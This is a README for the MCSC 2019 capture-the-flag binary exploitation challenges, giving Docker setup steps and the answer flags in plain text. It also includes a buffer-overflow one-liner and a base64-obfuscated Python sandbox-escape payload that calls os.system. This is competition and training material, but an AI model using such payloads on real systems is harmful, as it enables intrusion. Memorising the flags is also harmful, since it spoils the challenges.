## MCSC 2019 Binary Exploitation Challenges
>thinbashane < @art0flunam00n >

**1.warmup - 50**

Description 
 - get the flag ! 
 - pwn50.c 

Flag
 - `MCSC_2019{v4riabl3_0v3rwrite3_b0f}`

Setting up
 - `cd pwn50` - change directory to the challenge
 - `docker build -t pwn50 .` - build from Dockerfile
 - `docker run -p 1337:1337 pwn50` - run docker containter
 - `nc <server_ip> 1337` - Challenge Access 

Solution
	 - `python -c 'print "MCSC"*30'`

Writeup
 - releases after competition
---
**2.interview - 100**

Description
 - Read the fl4g file
 - Binary file

Flag
 - `MCSC_2019{buff3r_0verfl0w_15_3a5y}`

Setting up
 - `cd pwn100b` - change directory to the challenge
 - `docker build -t pwn100b .` - build from Dockerfile
 - `docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p 2222:2222 pwn100b` - run docker containter
 - `nc <server_ip> 2222`

Writeup
 - releases after competition
 - exp.py

---
**3.lolcalc - 200**

Description
 - Read the fl4g file

Flag
 - `MCSC_2019{mM_5and_b0x_fuN_b0y_}`

Setting up
 - `cd pwn200` - change directory to the challenge
 - `docker build -t pwn200 .` - build from Dockerfile
 - Run docker 
	 - ```docker run -p 1997:1997 pwn200```
 - `SSH service`  

Writeup
 - releases after competition
 - `__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system("f***")`

**4.password - 250**

Description
 - Read the fl4g file
 - binary file

Flag
 - `MCSC_2019{UAF_u53_4ft3r_fr33_fl4g}`

Setting up
 - `cd pwn200` - change directory to the challenge
 - `docker build -t pwn200 .` - build from Dockerfile
 - Run docker 
	 - ```docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p 1994:1994 pwn200```
 - `nc <server_ip> 1994` 

Writeup
 - releases after competition
 - exploit.py


